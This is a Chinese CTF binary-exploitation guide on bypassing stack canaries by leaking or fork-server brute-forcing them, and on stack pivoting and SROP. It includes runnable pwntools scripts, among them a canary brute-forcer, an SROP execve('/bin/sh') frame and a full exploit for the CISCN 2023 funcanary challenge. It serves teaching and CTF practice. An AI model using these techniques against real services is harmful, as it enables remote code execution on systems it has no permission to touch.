# 栈保护绕过（Canary / 栈迁移 / SROP）

关键词：canary 栈保护 栈金丝雀 stack canary 栈迁移 stack migration stack pivot SROP sigreturn rt_sigreturn 信号返回 爆破canary fork服务器 逐字节爆破 leave ret fs:0x28 gs:0x14 __stack_chk_fail 栈溢出保护

## ① 识别指纹

- `checksec` 的 **Stack 行显示 `Canary found`** —— 本页最硬的入口信号
- 函数序言/尾声能看到 `mov rax, qword ptr fs:[0x28]`（64 位）或 `mov eax, dword ptr gs:[0x14]`（32 位）
- 溢出后不是普通的 `Segmentation fault`，而是先打印 `*** stack smashing detected ***` 再 `abort`
- `main` 是一个 `while (1) { fork(); ... }` 的 fork 服务器，每轮输入都是新子进程
- 可写长度覆盖得到 saved rbp，但**放不下一条完整 ROP 链**；或缓冲区很小、输入点离栈顶很远
- `ROPgadget` 能搜到 `leave; ret` / `pop rbp; ret`，二进制里同时有已知可写的 `.bss`
- 二进制极小、静态链接、只有 `read` / `write` 两个封装，且有 `syscall; ret` 或 `mov rax, 15` —— SROP 的脸
- 题名/题干出现 `canary`、`babystack`、`migrate`、`srop`、`sigreturn`、`stack pivot`

## ② 考什么

- Canary 的存取位置：64 位 `fs:0x28`，32 位 `gs:0x14`；进程启动时随机一次，`fork` 出的子进程继承同一份
- Canary 最低字节固定 `\x00`：这是"字符串截断"设计 —— `strcpy`/`gets` 写到它就会停；但这一位因此变成**公开已知值**，用 `read` 输入的题可以把 `\x00` 原样写回去，截断没有实际防护效果
- 32 位 canary 4 字节（只需猜 3 字节），64 位 8 字节（只需猜 7 字节）；两种架构的 `\x00` 都在**内存第一字节**（小端最低位），不在最高位
- 泄露通道：定长 `write`/`fwrite`、格式化字符串 `%p`、`puts`/`printf("%s")` 的越界读
- `__stack_chk_fail`：不是泄露通道，是爆破时的**判定预言机** —— 打印 `stack smashing detected` 就是猜错
- 爆破前提：fork 服务器且父进程不 `exec`；整个爆破只维持一个连接
- 栈迁移：`leave` = `mov rsp, rbp; pop rbp`，随后 `ret` 从新 `rsp` 取地址
- `pop rbp; ret` 变体：先用它把 rbp 改成目标地址，再借函数尾声已有的 `leave; ret` 完成同样的迁移
- 迁移目标：`.bss` / `.data` 等已知可写地址；NX 下只能放 ROP 链，不能放 shellcode
- SROP：`rax = 15` + `syscall` 触发 x86-64 的 `rt_sigreturn`（32 位是 `119`），内核按栈上的 `sigframe` 恢复**全部寄存器**
- `SigreturnFrame` 的字段：`rax`（59 = `execve`）、`rdi`（`/bin/sh`）、`rsi`/`rdx`（0）、`rip`（`syscall`）、`rsp`
- amd64 的 frame 长度是 `0xf8` 字节；`bytes(frame)` 直接拼，不能再套 `p64`
- 保护组合：Canary + PIE 要先泄露 PIE；Canary + Full RELRO 通常要换攻击面

## ③ 判断流程

### ③-1 子类型分流

1. `checksec --file=./pwn` 看 Stack 行 → `No canary found` 说明本页不适用，回 [栈溢出基础](/pwn/stack-basic) 或 [ROP 与 ret2libc](/pwn/rop-ret2libc)；`Canary found` → 进 2
2. `objdump -d -M intel ./pwn | grep -E 'fs:0x28|gs:0x14'` → 有输出才确认是真 canary；没有就回第 1 条复核编译选项 → 进 3
3. 程序有没有"按可控长度输出缓冲区"的行为（`write(1, buf, N)`、`puts(buf)`、`printf(buf)`）→ 有 → **泄露流**，走 ③-2 A 组；没有 → 进 4
4. `objdump -d ./pwn | grep -w fork` 或 `strace -f ./pwn` 看到 `fork(` → **爆破流**，走 ③-2 B 组；没有 fork → 进 5
5. 能覆盖到返回地址吗？→ 不能 → 进 6；能，但可写字节放不下完整链（`pop rdi; ret` + 参数 + 函数约 24–32 字节），且有 `leave; ret` → **栈迁移流**，走 ③-2 C 组；能且放得下，但二进制里没有可用的 libc 与多参数 gadget，且有 `syscall; ret` 且能控制 `rax` → **SROP 流**，走 ③-2 D 组；能且放得下、也有可用 gadget → 按正常 ROP，转 [ROP 与 ret2libc](/pwn/rop-ret2libc) 结束
6. 盖不到返回地址 → 换输入点，或找同一程序里另一个能溢出的函数；所有输入点都只到 saved rbp 之前 → 进 7
7. 以上都不成立 → 回第 1 条，按「Canary + PIE」「Canary + Full RELRO」重新组合，必要时转 [地址泄露与 PIE 绕过](/pwn/leak-pie)；仍然无解 → 回 [题型总表](/map) 换方向

### ③-2 成本排序链

**A. 泄露 canary（有输出点，最省事）**

1. `objdump` 定位 canary 的取指与校验，确认缓冲区后面紧挨着 canary；零成本，先做 → 进 2
2. gdb 里 `cyclic 200` 冲到校验点，`p &buf` 拿缓冲区地址、`x/gx $rbp-8`（32 位 `x/wx $ebp-0xc`）拿 canary 地址，两者相减得到填充长度 → 进 3
3. 输出是定长 `write(1, buf, N)` 且 `N` 大于缓冲区 → 读满缓冲区，回显里直接包含完整 8 字节 canary（含 `\x00`），跳 6
4. 输出是格式化字符串（输入被直接当格式串）→ 发一串 `%p` 扫栈，找形如 `0x....00` 的值，记录它出现在第几个 `%p`，之后用 `%<N>$p` 稳定取出，跳 6
5. 输出是 `puts`/`printf("%s")` → 先把 canary 第 0 字节覆盖为任意非零字节，让字符串穿过那个 `\x00`，从回显收 canary 的高 7 字节；这要求打印发生在函数返回前，且同一进程还能再打一轮（fork 服务器或菜单循环）→ 进 6
6. 还原 canary：`\x00` 补在**内存第一字节**（小端最低位）；用 `p64(canary)` 发送 → 进 7
7. 确认输入函数能写 `\x00`（`read`/`fread` 可以；`gets`/`scanf("%s")` 不行）→ 不行回到 ③-1 第 4 条改爆破；可以则拼「填充 + canary + 8 字节 saved rbp + 返回地址」结束

**B. 爆破 canary（fork 服务器）**

1. `objdump -d ./pwn | grep -wE 'fork|execve'` → 有 `fork` 且无 `execve` 才成立；没有 fork 就回 ③-1 第 5–6 条找别的路 → 进 2
2. 只开**一个** `process`/`remote`，后面所有尝试都复用它；每字节重连会重新 `exec`，canary 必变 → 进 3
3. gdb 里算「缓冲区首 → canary」长度（同 A 组第 2 条），确认 `read` 长度足够覆盖到 canary → 进 4
4. 从第 1 个字节开始猜（第 0 个已知是 `\x00`），每字节试 `0x00`–`0xff`；payload = 填充 + 已确认字节 + 候选字节 → 进 5
5. 用回显判定：出现 `stack smashing detected` / 连接断开 = 猜错；出现程序正常的下一轮提示 = 猜对，把该字节并入已知前缀 → 进 6
6. 64 位最多 `7 × 256 = 1792` 次，32 位最多 `3 × 256 = 768` 次；猜完得到完整 canary → 进 7
7. 拼「填充 + canary + saved rbp + 返回地址」；PIE 还开着就转 [地址泄露与 PIE 绕过](/pwn/leak-pie) 做 partial overwrite 结束；否则直接跳后门/ROP 结束

**C. 栈迁移（溢出的空间放不下链）**

1. 先确认真的需要迁移：算「可写字节数 − 到 ret 的距离」是否小于链长；够放完整链就按正常 ROP 打，不必迁移 → 进 2
2. `ROPgadget --binary ./pwn | grep -E 'leave ; ret|pop rbp ; ret'`，记下地址；PIE 开着先解决 PIE → 进 3
3. 找可写目标：`readelf -S ./pwn` 看 `.bss`，选一个不覆盖程序关键数据的地址 `S` 作为链首 → 进 4
4. 确认有第二次写入通道：程序在 `leave` 之前还会 `read` 一次，或链条第一跳就是 `read(0, S, N)` 把后续链搬进来 → 进 5
5. 第一次 payload：`填充 + p64(S - 8) + p64(leave_ret)`；`S - 8` 是因为第二次 `leave` 的 `pop rbp` 会先吃掉 8 字节 → 进 6
6. 第二次输入把完整链写到 `S`（或第一跳 `read` 把链读进去）→ 进 7
7. gdb 在 `leave` 前后看 `p/x $rsp` 与 `x/4gx $rsp`，确认 `rsp` 落到 `S`；链错位就回第 5 条；确认无误后执行链结束

**D. SROP（`sigreturn` 帧）**

1. `ROPgadget --binary ./pwn | grep -E 'syscall|mov rax, 0xf|mov eax, 0xf|pop rax'` → 有 `syscall; ret` 才成立；没有就回 ③-1 第 7 条 → 进 2
2. 确认能控制 `rax`：优先 `mov rax, 0xf; ret` / `pop rax; ret`；都没有就用 `read(0, dst, 15)` 的返回值凑 15 → 进 3
3. 确认 frame 落点：溢出空间够放 `0xf8` 字节就接在返回地址后；不够就先 `read` 到 `.bss` 再 `leave; ret` 迁移过去 → 进 4
4. 构造 `SigreturnFrame()`：`rax = 59`、`rdi = /bin/sh 地址`、`rsi = 0`、`rdx = 0`、`rip = syscall; ret` → 进 5
5. 拼 payload：`填充 + p64(rax15) + p64(syscall_ret) + bytes(frame)`；此后 `rsp` 正好指向 frame 首字节 → 进 6
6. `/bin/sh` 不在已知地址时：把它写在 frame 之后，用泄露的栈地址算出位置回填 `frame.rdi`；或直接在二进制/libc 里找现成的 `/bin/sh` → 进 7
7. 执行后无 shell：gdb 断在 `syscall` 看 `$rax`（必须是 15）与 `$rsp`（必须指向 frame 首）；`rax` 不对回第 2 条，`execve` 参数不对回第 4、6 条

## ④ 工具与命令

```bash
checksec --file=./pwn
objdump -d -M intel ./pwn | grep -E 'fs:0x28|gs:0x14'
objdump -d ./pwn | grep -wE 'fork|execve'
ROPgadget --binary ./pwn | grep -E 'leave ; ret|pop rbp ; ret'
ROPgadget --binary ./pwn | grep -E 'syscall|mov rax, 0xf|mov eax, 0xf'
readelf -S ./pwn | grep -E '\.bss|\.data'
```

```text
# gdb（pwndbg）里直接读 canary
pwndbg> canary                  # pwndbg 自带命令
pwndbg> x/gx $rbp-8             # 64 位：缓冲区的 canary 槽
pwndbg> x/wx $ebp-0xc           # 32 位
pwndbg> p/x $fs_base+0x28       # 64 位 canary 的权威来源
pwndbg> p/x $gs_base+0x14       # 32 位
```

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

# fork 服务器逐字节爆破：全程只开一个连接
io = process('./pwn')            # 远程同样只 remote 一次
fill = b'A' * 0x68               # 缓冲区首 -> canary，gdb 实测
canary = b'\x00'

io.recvuntil(b'welcome')          # 先同步到第一个子进程（banner 按题目输出替换）
while len(canary) < 8:
    for guess in range(256):
        io.send(fill + canary + bytes([guess]))
        data = io.recvuntil(b'welcome', timeout=1)   # 本轮输出 + 下一子进程 banner
        if b'stack' not in data:                     # 判定串按题目实际输出调整
            canary += bytes([guess])
            break
log.success(f'canary = {canary.hex()}')
```

```python
from pwn import *
context.arch = 'amd64'

frame = SigreturnFrame()
frame.rax = constants.SYS_execve      # 59
frame.rdi = bin_sh                    # /bin/sh 的地址
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload  = b'A' * offset
payload += p64(rax_15)                # mov rax, 0xf; ret
payload += p64(syscall_ret)
payload += bytes(frame)               # amd64 下 0xf8 字节，不要再套 p64
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 爆破时每字节重连，canary 一直变 | 每次连接都是新进程/新 `exec`，canary 重新随机 | 整个爆破只维持一个 `process`/`remote`，靠程序内部 `fork` 出新子进程 |
| 泄露的 canary 补了 `\x00` 仍然崩 | `\x00` 补在了最高位 | `\x00` 是**内存第一字节**（小端最低位），补在末尾的那个位置 |
| 字符串输出只泄露到 7 字节 | 输出在 canary 的 `\x00` 处停止 | 低字节已知是 `0x00`，直接补；或改用定长 `write`/`%p` |
| 用 `gets`/`scanf("%s")` 时 canary 写不回去 | 输入函数遇 `\x00` 截断 | 换 `read`/`fread`；或改走泄露/爆破 |
| canary 正确但控制流没变 | 64 位漏算了 saved rbp 的 8 字节 | 填充 = 缓冲区→canary + 8(canary) + 8(saved rbp)，再写 ret |
| 栈迁移后链错位 8 字节 | `leave` 先 `pop rbp`，吃掉 8 字节 | saved rbp 写 `链首 - 8`，或链首放 8 字节占位 |
| 迁移到 `.bss` 后一执行就崩 | NX 下 `.bss` 不可执行，或链没写进去 | 只放 ROP 不放 shellcode；迁移前用 `read` 把链写入 |
| `leave; ret` 地址每次不同 | PIE 开着 | 先泄露 PIE base，或做 partial overwrite |
| 爆破到某一字节后怎么猜都错 | 回显没同步，上一轮的 banner 被这一轮读走 | 每轮读到**下一个子进程的 banner** 再发下一轮，超时放大到 2 秒 |
| SROP 触发后毫无反应 | `rax` 不是 15 | 用 `read` 返回值凑 15，或找 `mov rax, 0xf; ret` |
| SROP 崩在 `syscall` | `rsp` 没指向 frame 首 | frame 紧跟 `syscall` 的返回地址；或先迁移 `rsp` |
| 32 位题按 64 位写 | `gs:0x14`、`119`、frame 布局都不同 | 按架构分开处理，32 位用 `p32` |

## ⑥ 例题

**题目**：`[CISCN 2023 初赛] funcanary`
**来源**：CISCN 2023 初赛；NSSCTF 收录，题解入口以原题平台为准

**题干**：给一个 64 位 ELF。程序在 `main` 里循环 `fork`，子进程打印 `welcome` 后读入一段内容；读入的缓冲区只有 104 字节，却允许写 0x80 字节。程序里有一个从不被调用的后门，执行 `system("/bin/cat flag")`。

**关键观察**：
- `checksec`：64 位、Full RELRO、**Canary found、NX enabled、PIE enabled**
- `main` 里有 `fork()`，父进程 `wait`，子进程处理输入 —— 典型的 canary 爆破场景
- 缓冲区在 `rbp-0x70`，canary 在 `rbp-0x8`：`0x70 - 0x8 = 0x68` 是填充长度
- `0x68 + 8(canary) + 8(saved rbp) + 8(ret) = 0x80`，正好等于 `read` 的长度 —— 溢出刚好够到返回地址
- 后门里 `system("/bin/cat flag")` 的调用点在二进制内的偏移低 12 位是 `0x231`（不同题解记作 `0x1229`/`0x1231`，以你的附件为准），PIE 页对齐使低 12 位固定，只需覆盖返回地址低 2 字节

**走了哪条链**：③-1 第 2 条（确认 canary）→ 第 3 条（程序不打印缓冲区，不走泄露）→ 第 4 条（发现 fork）→ ③-2 B 组第 1–6 条；拿到返回地址控制权后 PIE 仍开着，转 [地址泄露与 PIE 绕过](/pwn/leak-pie) 的 partial overwrite。

**命令与输出**：

```text
$ checksec --file=funcanary
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

偏移是算出来的，不是猜的：

```text
buf      = rbp - 0x70
canary   = rbp - 0x8
填充长度 = 0x70 - 0x8 = 0x68
总长度   = 0x68 + 8 + 8 + 8 = 0x80  == read 的长度
```

```python
from pwn import *
context.log_level = 'error'

io = process('./funcanary')      # 远程换成 remote(...)，整个过程只连一次
fill = b'A' * 0x68
canary = b'\x00'

io.recvuntil(b'welcome')          # 先同步到第一个子进程
while len(canary) < 8:           # 第 0 字节已知是 0x00
    for guess in range(256):
        io.send(fill + canary + bytes([guess]))
        data = io.recvuntil(b'welcome', timeout=1)   # 本轮输出 + 下一子进程 banner
        if b'stack' not in data:                    # 猜错时 __stack_chk_fail 回显含 stack
            canary += bytes([guess])
            break
print('canary =', canary.hex())

# PIE 低 12 位固定为 0x231，第三半字节共 16 种
for i in range(16):
    payload  = b'A' * 0x68 + canary + b'B' * 8
    payload += p16(0x231 | (i << 12))
    io.send(payload)
    data = io.recvuntil(b'welcome', timeout=2)   # 命中时 flag 与下一轮 banner 都在这里
    if b'{' in data:                             # 回显里出现 flag
        print(data)
        break
```

**结果**：后门执行 `system("/bin/cat flag")`，回显直接给出 flag。本页不固定 flag 内容，原题平台上的格式以题目为准：`flag{...}`。

::: tip 为什么爆破能成立
`fork` 出来的子进程是父进程地址空间的拷贝，canary 也跟着复制，且子进程崩溃不会杀掉父进程。所以「整个爆破只开一个连接、反复让父进程 fork」是前提；一旦重连导致新进程 `exec`，canary 就重新随机，前面的字节全部作废。
:::
